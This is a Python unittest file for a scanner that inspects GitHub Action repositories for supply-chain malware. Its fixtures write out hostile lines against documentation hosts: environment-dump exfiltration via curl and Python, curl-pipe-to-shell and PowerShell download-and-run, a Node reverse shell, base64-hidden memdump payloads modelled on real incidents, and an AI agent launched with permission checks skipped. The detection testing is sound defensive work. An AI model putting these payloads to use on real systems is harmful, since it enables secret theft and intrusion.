"""An action's own code (0.1.9, N-4): registry/actionmeta.py, which reads what an
action.yml runs and a Dockerfile, and repo.scan_action, which scans an action's
repository at a commit as the runner runs it (artifact "action").

The archives are built here in GitHub's shape (one top directory, the commit in
a pax global header); every address is a documentation one (RFC 5737, .invalid).
"""

import base64
import json
import unittest
from unittest import mock

from lazaret.registry import actionmeta as am
from lazaret.registry import repo
from tests.registry import _actions_support as fx

SHA = "0123456789abcdef0123456789abcdef01234567"
ENV_SENT = 'curl -sS -X POST --data "$(env | base64 -w0)" https://collect.example.invalid/x\n'
PIPED = "curl -sfL https://example.invalid/install.sh | sh -s -- -b \"$D\"\n"


def scan(files, root=""):
    return repo.scan_action(fx.archive("o/r", SHA, files), root)


def counted(res):
    return [(i["rule"], i["sev"], i["file"], i["line"]) for i in res["issues"]
            if i["rule"].startswith("SC-") and i["rule"] not in repo.TRUNCATION_RULES and i["sev"] != "INFO"]


def composite(*runs, shell="bash"):
    steps = "".join(f"    - shell: {shell}\n      run: |\n" + "".join(f"        {line}\n" for line in run.split("\n") if line)
                    for run in runs)
    return f"name: x\nruns:\n  using: composite\n  steps:\n{steps}"


class ReadTests(unittest.TestCase):
    def test_what_runs_is_read(self):
        meta = am.read("name: x\nruns:\n  using: 'Node20'\n  main: \"dist/index.js\"\n  post: dist/post.js  # cleanup\n"
                       "  post-if: success()\n")
        self.assertEqual(meta.using, "node20")
        self.assertEqual(meta.runs["main"], ("dist/index.js", 4))
        self.assertEqual(meta.runs["post"], ("dist/post.js", 5))
        self.assertEqual(meta.steps, [])

    def test_a_composite_actions_steps(self):
        text = ("runs:\n  using: composite\n  steps:\n"
                "    - name: one\n      shell: bash\n      working-directory: ${{ github.action_path }}\n"
                "      run: |\n        if true; then\n          ./x.sh\n        fi\n"
                "    - uses: actions/checkout@v4\n      with:\n        path: x\n"
                "    -\n      shell: python\n      run: print(1)\n")
        meta = am.read(text)
        self.assertEqual([(s.line, s.shell, s.uses, s.run_line) for s in meta.steps],
                         [(4, "bash", "", 8), (11, "", "actions/checkout@v4", None), (15, "python", "", 16)])
        self.assertEqual(meta.steps[0].run, "if true; then\n  ./x.sh\nfi")            # its indentation kept
        self.assertEqual(meta.steps[0].workdir, "${{ github.action_path }}")
        self.assertEqual(meta.steps[2].run, "print(1)")

    def test_the_shells(self):
        for shell, kind in (("", "sh"), ("bash", "sh"), ("sh -e {0}", "sh"), ("/usr/bin/bash --noprofile {0}", "sh"),
                            ("pwsh", "ps"), ("powershell", "ps"), ("python", "py"), ("python3 {0}", "py"),
                            ("node {0}", "js"), ("cmd", "cmd"), ("perl {0}", "other")):
            self.assertEqual(am.step_shell(shell), kind, shell)

    def test_the_actions_directory_in_a_command(self):
        for text in ("${{ github.action_path }}/x.sh", "${{github.action_path}}/x.sh", "${{ GITHUB.ACTION_PATH }}/x.sh",
                     "${{ github['action_path'] }}/x.sh", "$GITHUB_ACTION_PATH/x.sh", "${GITHUB_ACTION_PATH}/x.sh",
                     '"$GITHUB_ACTION_PATH"/x.sh', "$env:GITHUB_ACTION_PATH/x.sh", "%GITHUB_ACTION_PATH%/x.sh"):
            self.assertEqual(am.substitute(text), am.ACTION_DIR + "/x.sh", text)
        self.assertEqual(am.substitute("$GITHUB_ACTION_PATHS/x"), "$GITHUB_ACTION_PATHS/x")
        self.assertEqual(am.in_action(am.ACTION_DIR + "/a/../b.sh"), "b.sh")
        self.assertEqual(am.in_action(am.ACTION_DIR.lstrip("/") + "/c.sh"), "c.sh")      # (after a cd into it)
        for outside in ("./x.sh", "$GITHUB_WORKSPACE/x.sh", am.ACTION_DIR, am.ACTION_DIR + "/../x.sh", "/etc/x"):
            self.assertIsNone(am.in_action(outside), outside)

    def test_the_commands_of_a_script(self):
        cmds, complete = am.commands("# a comment\ncd $GITHUB_ACTION_PATH\n./a.sh \\\n  --flag\n\nbash ./b.sh\n")
        self.assertTrue(complete)
        self.assertEqual(cmds, [f"cd {am.ACTION_DIR} && ./a.sh --flag", f"cd {am.ACTION_DIR} && bash ./b.sh"])
        cmds, _ = am.commands("./a.sh\n", workdir="${{ github.action_path }}/sub")
        self.assertEqual(cmds, [f"cd {am.ACTION_DIR}/sub && ./a.sh"])
        with mock.patch.object(am, "MAX_COMMANDS", 2):
            self.assertEqual(am.commands("a\nb\nc\n"), (["a", "b"], False))

    def test_a_powershell_script_as_the_command_that_runs_it(self):
        self.assertEqual(am.powershell_command('# x\nWrite-Host "a"\niwr x | iex\n'),
                         'pwsh -Command "Write-Host \\"a\\"; iwr x | iex"')


class DockerfileTests(unittest.TestCase):
    def test_bases_stages_and_what_runs(self):
        d = am.dockerfile("# syntax=docker/dockerfile:1\nARG BASE=debian:12\nFROM --platform=$BUILDPLATFORM golang:1.22 AS build\n"
                          "FROM build AS test\nFROM scratch AS empty\nFROM ${BASE}\n"
                          f"FROM ghcr.io/o/x@sha256:{'a' * 64} AS pinned\nFROM pinned\nWORKDIR /app\nWORKDIR sub\n"
                          "COPY --from=build /out/x /usr/bin/x\nCOPY [\"run.sh\", \"lib/\", \"./\"]\n"
                          "ADD https://example.invalid/t.tgz /t.tgz\nENTRYPOINT [\"/app/sub/run.sh\", \"--x\"]\nCMD exec \\\n  run\n")
        self.assertEqual([(line, image, pinned) for line, image, pinned, _a in d.bases],
                         [(3, "golang:1.22", False), (6, "debian:12", False), (7, f"ghcr.io/o/x@sha256:{'a' * 64}", True)])
        self.assertEqual(d.entrypoint, (14, ["/app/sub/run.sh", "--x"], True))
        self.assertEqual(d.cmd, (15, ["exec", "run"], False))
        self.assertEqual(d.copies, [(["run.sh", "lib/"], "./", "/app/sub")])         # (--from and URLs are not the context's)
        self.assertEqual(d.workdir, "/app/sub")

    def test_a_new_stage_forgets_the_last_ones_entrypoint(self):
        d = am.dockerfile("FROM a:1 AS x\nENTRYPOINT [\"/x\"]\nCOPY a /a\nFROM b:1\n")
        self.assertEqual((d.entrypoint, d.copies), (None, []))

    def test_the_file_a_path_of_the_image_holds(self):
        files = {"entrypoint.sh", "src/main.py", "src/lib/u.py", "app/index.js"}
        dirs = {"src", "src/lib", "app"}
        look = lambda path, copies: am.context_file(path, copies, files.__contains__, dirs.__contains__)
        self.assertEqual(look("/entrypoint.sh", [(["entrypoint.sh"], "/entrypoint.sh", "/")]), "entrypoint.sh")
        self.assertEqual(look("/usr/bin/entrypoint.sh", [(["entrypoint.sh"], "/usr/bin/", "/")]), "entrypoint.sh")
        self.assertEqual(look("/app/entrypoint.sh", [(["entrypoint.sh"], "/app", "/")]), "entrypoint.sh")   # an image's dir
        self.assertEqual(look("/srv/lib/u.py", [(["src"], "/srv", "/")]), "src/lib/u.py")               # a dir's contents
        self.assertEqual(look("/w/app/index.js", [(["."], ".", "/w")]), "app/index.js")
        self.assertEqual(look("/x", [(["entrypoint.sh"], "/x", "/"), (["src/main.py"], "/x", "/")]), "src/main.py")
        self.assertIsNone(look("/x", [(["../secret"], "/x", "/")]))
        self.assertIsNone(look("/nowhere", [(["."], "/app", "/")]))


class JudgeTests(unittest.TestCase):
    def test_what_ci_code_does_as_its_job_is_not_counted(self):
        for reasons in (["sends environment variables over the network ($CODECOV_TOKEN)"],
                        ["uploads a local file over the network (coverage.xml)"], ["starts another program"],
                        ["publishes a package to a registry (npm publish)"],
                        ["reads files outside the package and sends them over the network (dist/x)"],
                        ["contacts an address typical of data exfiltration (http://127.0.0.1)"],
                        ["contacts an address typical of data exfiltration (http://localhost:10000/x)"]):
            self.assertEqual(am.judge(reasons), (None, []), reasons)

    def test_a_script_fetched_and_run_is_major_and_a_stealers_shape_critical(self):
        self.assertEqual(am.judge(["pipes a download into a shell"]), ("MAJOR", ["pipes a download into a shell"]))
        self.assertEqual(am.judge(["runs PowerShell that downloads and runs code"])[0], "MAJOR")
        self.assertEqual(am.judge(["downloads a script and runs it with python3"])[0], "MAJOR")
        self.assertEqual(am.judge(["sends environment variables over the network (the whole environment)"])[0], "CRITICAL")
        self.assertEqual(am.judge(["opens a reverse shell", "pipes a download into a shell"])[0], "CRITICAL")
        self.assertEqual(am.judge(["contacts an address typical of data exfiltration (http://203.0.113.8)"])[0], "MAJOR")
        self.assertEqual(am.judge(["adds a cron job"]), ("MAJOR", ["adds a cron job"]))
        self.assertEqual(am.judge(["starts another program", "writes code it decodes to a file and runs it with bash"]),
                         ("CRITICAL", ["writes code it decodes to a file and runs it with bash"]))


class ScanActionTests(unittest.TestCase):
    def test_action_yml_comes_before_action_yaml(self):
        yml = fx.action_yml("node20", main="a.js")
        res = scan({"action.yaml": fx.action_yml("node20", main="b.js"), "action.yml": yml, "a.js": "1;\n", "b.js": "2;\n"})
        self.assertEqual((res["action"]["metadata"], res["action"]["runs"]), ("action.yml", {"runs.main": "a.js"}))
        res = scan({"action.yaml": fx.action_yml("node20", main="b.js"), "b.js": "2;\n"})
        self.assertEqual(res["action"]["runs"], {"runs.main": "b.js"})

    def test_node_finds_a_main_without_its_extension_and_nothing_outside_the_repository(self):
        res = scan({"x/action.yml": fx.action_yml("node20", main="../dist/main", post="../../../etc/x.js"),
                    "dist/main.js": "1;\n"}, root="x")
        self.assertEqual(res["action"]["runs"], {"runs.main": "dist/main.js"})
        self.assertEqual(res["action"]["missing"], [("runs.post", "../../etc/x.js")])

    def test_what_is_not_read_is_incomplete(self):
        res = scan({"action.yml": fx.action_yml("wasm1", main="a.js")})
        self.assertEqual(res["verdict"], "INCOMPLETE")
        self.assertIn("'wasm1'", res["action"]["notes"][0])
        with mock.patch.object(am, "MAX_METADATA_BYTES", 10):
            res = scan({"action.yml": fx.action_yml("node20", main="a.js"), "a.js": "1;\n"})
        self.assertEqual((res["verdict"], res["action"]["metadata"]), ("INCOMPLETE", None))

    def test_the_runner_runs_no_npm_script_and_builds_no_gyp(self):
        res = scan({"action.yml": fx.action_yml("node20", main="a.js"), "a.js": "1;\n",
                    "package.json": json.dumps({"scripts": {"preinstall": ENV_SENT, "install": PIPED}}),
                    "binding.gyp": "{'targets': [{'actions': [{'action': ['sh', '-c', 'curl https://192.0.2.1/x | sh']}]}]}\n"})
        self.assertEqual((res["verdict"], counted(res)), ("OK", []))

    def test_a_python_step_and_a_powershell_one(self):
        py = 'import os, urllib.request\nurllib.request.urlopen("https://collect.example.invalid/x", data=repr(dict(os.environ)).encode())\n'
        res = scan({"action.yml": composite(py, shell="python")})
        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "CRITICAL", "action.yml", 7)])
        res = scan({"action.yml": composite("iwr -useb https://example.invalid/i.ps1 | iex", shell="pwsh")})
        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "MAJOR", "action.yml", 7)])
        self.assertIn("runs PowerShell that downloads and runs code", res["issues"][0]["msg"])

    def test_a_step_runs_a_script_that_starts_another(self):
        res = scan({"action.yml": composite("bash ${{ github.action_path }}/a.sh"),
                    "a.sh": "#!/bin/bash\nnode \"$(dirname \"$0\")/b.js\"\nbash ./c.sh\n", "c.sh": ENV_SENT,
                    "b.js": "module.exports = 1;\n"})
        self.assertEqual(res["action"]["runs"], {"step 1": "a.sh"})
        self.assertEqual(counted(res), [])                  # c.sh is the job's workspace's: the script's cwd is not the action

    def test_code_no_action_needs_anywhere_in_the_repository(self):
        shell = ("const net=require('net'),cp=require('child_process');const s=new net.Socket();"
                 "s.connect(4444,'203.0.113.9',()=>{const sh=cp.spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);});\n")
        res = scan({"action.yml": fx.action_yml("node20", main="a.js"), "a.js": "1;\n", "lib/x.js": shell,
                    "scripts/setup.js": "require('child_process').execSync('curl -sSf https://example.invalid/i.sh | sh');\n"})
        self.assertEqual(sorted(counted(res)), [("SC-USE-RISK", "CRITICAL", "lib/x.js", 1),
                                                ("SC-USE-RISK", "MAJOR", "scripts/setup.js", 1)])
        self.assertIn("The action's scripts do not load it", next(i["msg"] for i in res["issues"] if i["file"] == "lib/x.js"))

    def test_an_ai_agent_launched_is_major_in_an_action(self):
        js = "const cp = require('child_process');\ncp.spawn('claude', ['--dangerously-skip-permissions', '-p', process.env.P]);\n"
        res = scan({"action.yml": fx.action_yml("node20", main="a.js"), "a.js": js})
        hijack = [i for i in res["issues"] if i["rule"] == "SC-AGENT-HIJACK"]
        self.assertEqual([i["sev"] for i in hijack], ["MAJOR"])
        self.assertIn("An action may exist to run an AI agent", hijack[0]["msg"])
        self.assertEqual(res["verdict"], "WARN")

    def test_the_tj_actions_shape(self):
        payload = base64.b64encode(b"curl -sSf https://203.0.113.7/memdump.py | sudo python3 | base64 -w 0").decode()
        js = ("const fs = require('fs');\nconst cp = require('child_process');\nasync function updateFeatures() {\n"
              f"  const s = Buffer.from('{payload}', 'base64').toString();\n  fs.writeFileSync('/tmp/run.sh', s);\n"
              "  cp.execSync('bash /tmp/run.sh');\n}\nupdateFeatures();\n")
        res = scan({"action.yml": fx.action_yml("node20", main="dist/index.js"), "dist/index.js": js})
        self.assertEqual((res["verdict"], counted(res)), ("SUSPICIOUS", [("SC-IMPORT-RISK", "CRITICAL", "dist/index.js", 6)]))
        self.assertIn("runs when the action runs (runs.main)", res["issues"][0]["msg"])

    def test_the_reviewdog_shape(self):
        # what reviewdog/action-setup's install.sh carried in March 2025, made inert: a script kept in base64, decoded and
        # piped into bash, which fetched a Python script and ran it with sudo
        inner = b"curl -sSf https://gist.example.invalid/memdump.py | sudo python3 | tr -d '\\0' | base64 -w 0"
        script = "#!/bin/sh\nset -e\necho '" + base64.b64encode(inner).decode() + "' | base64 -d | bash\n"
        res = scan({"action.yml": composite("$GITHUB_ACTION_PATH/install.sh"), "install.sh": script})
        self.assertEqual((res["verdict"], counted(res)), ("SUSPICIOUS", [("SC-INSTALL-HOOK", "CRITICAL", "action.yml", 7)]))
        self.assertIn("runs install.sh, which pipes code it decodes into bash", res["issues"][0]["msg"])
        # what it decoded, run as it is: a script fetched and run, MAJOR in an action
        res = scan({"action.yml": composite("$GITHUB_ACTION_PATH/install.sh"), "install.sh": "#!/bin/sh\n" + inner.decode() + "\n"})
        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "MAJOR", "action.yml", 7)])
        self.assertIn("downloads a script and runs it with python3", res["issues"][0]["msg"])

    def test_a_docker_action(self):
        yml = fx.action_yml("docker", image="docker/Dockerfile", entrypoint="/srv/entry.sh")
        res = scan({"action.yml": yml, "docker/Dockerfile": "FROM node:22\nCOPY . /srv\nENTRYPOINT [\"node\", \"/srv/app.js\"]\n",
                    "docker/entry.sh": PIPED, "docker/app.js": "1;\n"})
        info = res["action"]
        self.assertEqual(info["bases"], [("docker/Dockerfile", 1, "node:22", False)])
        self.assertEqual(info["runs"], {"runs.entrypoint": "docker/entry.sh"})     # runs.entrypoint replaces ENTRYPOINT
        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "MAJOR", "action.yml", 5)])
        self.assertEqual(res["issues"][0]["name"], "Action entrypoint")
        res = scan({"action.yml": fx.action_yml("docker", image="Dockerfile"),
                    "Dockerfile": "FROM node:22\nCOPY . /srv\nENTRYPOINT [\"node\", \"/srv/app.js\"]\n", "app.js": "1;\n"})
        self.assertEqual(res["action"]["runs"], {"ENTRYPOINT": "app.js"})          # an entry point: the import-time test
        res = scan({"action.yml": fx.action_yml("docker", image="Dockerfile"), "Dockerfile": "FROM node:22\nCMD [\"/bin/run\"]\n"})
        self.assertIn("is not a file the Dockerfile copies from the repository", res["action"]["notes"][0])
        res = scan({"action.yml": fx.action_yml("docker", image="docker://ghcr.io/o/x:1")})
        self.assertIn("its code is the image's", res["action"]["notes"][0])
        res = scan({"action.yml": fx.action_yml("docker", image="Dockerfile")})
        self.assertEqual(res["action"]["missing"], [("runs.image", "Dockerfile")])

    def test_a_script_with_a_hostile_name_is_followed(self):
        name = "dist/\u202eevil\x1b[31m.sh"
        res = scan({"action.yml": composite("bash \"$GITHUB_ACTION_PATH/" + name + "\""), name: ENV_SENT})
        self.assertEqual(counted(res), [("SC-INSTALL-HOOK", "CRITICAL", "action.yml", 7)])
        self.assertEqual(res["action"]["runs"], {"step 1": name})

    def test_what_a_followed_script_starts_is_read_either_way(self):
        # a shell script's `node "$(dirname "$0")/b.js"` is not followed; b.js is read by the test of the files
        # nothing loads, which counts the shapes no action needs
        res = scan({"action.yml": composite("bash ${{ github.action_path }}/a.sh"),
                    "a.sh": "#!/bin/bash\nnode \"$(dirname \"$0\")/b.js\"\n",
                    "b.js": "require('child_process').execSync('curl -d \"$(env)\" https://b.example.invalid');\n"})
        self.assertEqual(res["action"]["runs"], {"step 1": "a.sh"})
        self.assertEqual(counted(res), [("SC-USE-RISK", "CRITICAL", "b.js", 1)])


if __name__ == "__main__":
    unittest.main()
